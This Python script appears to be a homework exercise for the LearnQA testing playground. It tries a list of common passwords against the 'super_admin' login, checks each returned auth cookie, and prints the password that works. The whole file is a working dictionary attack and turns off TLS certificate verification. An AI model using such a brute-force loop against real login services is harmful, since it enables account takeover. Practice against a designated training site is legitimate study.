import json

import requests

url1 = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
url2 = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
passwords = [
    "password", 123456, 123456789, 12345678, 12345, "qwerty", "abc123", "football", 1234567, "monkey", 111111,
    "letmein", 1234, 1234567890, "dragon", "baseball", "sunshine", "iloveyou", "trustno1", "princess", "adobe123[a]", 123123,
    "welcome", "login", "admin", "qwerty123", "solo", "1q2w3e4r", "master", 666666, "photoshop[a]", "1qaz2wsx", "qwertyuiop",
    "ashley", "mustang", 121212, "starwars", 654321, "bailey", "access", "flower", 555555, "passw0rd", "shadow", "lovely", 7777777,
    "michael", "!@#$%^&*", "jesus", "password1", "superman", "hello", "charlie", 888888, 696969, "hottie", "freedom", "aa123456",
    "qazwsx", "ninja", "azerty", "loveme", "whatever", "donald", "batman", "zaq1zaq1", 000000, "123qwe"]

for password in passwords:
    response_secret_pass_cookie = requests.post(url1, data={"login": "super_admin", "password": f"{password}"}, verify=False)
    obj = json.loads(response_secret_pass_cookie.text)
    print(response_secret_pass_cookie.status_code)
    print(response_secret_pass_cookie.text)
    print(dict(response_secret_pass_cookie.cookies))

    auth_cookie_value = response_secret_pass_cookie.cookies.get("auth_cookie")
    cookies = {}

    if obj["equals"]:
        cookies.update({"auth_cookie": auth_cookie_value})
        payload = {"auth_cookie": cookies}
        response_check_auth_cookie = requests.post(url2, cookies=cookies, verify=False)
        print(response_check_auth_cookie.text)
        right_password = {"password": password}
        if response_check_auth_cookie.text == "You are authorized":
            print(f"Правильный пароль: {right_password}")
            break



